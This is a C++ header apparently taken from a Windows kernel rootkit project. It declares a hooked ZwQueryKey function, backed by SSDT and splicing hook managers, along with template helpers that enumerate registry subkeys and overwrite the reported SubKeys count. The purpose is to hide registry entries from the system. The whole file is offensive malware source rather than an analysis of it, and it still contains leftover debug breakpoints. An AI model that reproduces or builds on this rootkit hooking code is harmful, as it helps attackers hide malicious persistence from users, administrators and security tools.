#pragma once
#include "../../SplicingManager/SplicingManager.h"
#include "../../SSDTManager/SSDTHooksManager.h"
#include "../../Structs/Structs.h"
#include "../../RootkitHooksConfig.h"
#include "../../Utils/Utils.h"

typedef NTSTATUS(*ZW_QUERY_KEY)(
    IN HANDLE  KeyHandle,
    IN KEY_INFORMATION_CLASS  KeyInformationClass,
    OUT PVOID  KeyInformation,
    IN ULONG  Length,
    OUT PULONG  ResultLength
    );

template <typename KeyClass>
NTSTATUS GetEnmurateClass(HANDLE keyHandle, KEY_INFORMATION_CLASS keyInfoClass ,KeyClass* keyClassStruct)
{
    ULONG infoLength = 0;

    auto infoStatus = ZwEnumerateKey(keyHandle, 1 ,keyInfoClass, NULL, 0, &infoLength);

    DbgBreakPoint();

    if (infoStatus == STATUS_BUFFER_TOO_SMALL)
    {
        *keyClassStruct = reinterpret_cast<KeyClass>(ExAllocatePool(NonPagedPool, infoLength));

        if (!(*keyClassStruct))
        {
            return STATUS_FAIL_CHECK;
        }

        infoStatus = ZwEnumerateKey(keyHandle, 1 ,keyInfoClass, *keyClassStruct, infoLength, &infoLength);

        if (!NT_SUCCESS(infoStatus))
        {
            ExFreePool(*keyClassStruct);
        }
    }

    return infoStatus;    
}

template <typename PInformationClass>
void ChangeInformation(PInformationClass informationClass, RegistryKey& key)
{
    DbgBreakPoint();
    informationClass->SubKeys = key.subkeysList.Size();
}

extern "C" NTSTATUS ZwQueryKeyHook_AnatherKeys(
    IN HANDLE  KeyHandle,
    IN KEY_INFORMATION_CLASS  KeyInformationClass,
    OUT PVOID  KeyInformation,
    IN ULONG  Length,
    OUT PULONG  ResultLength
);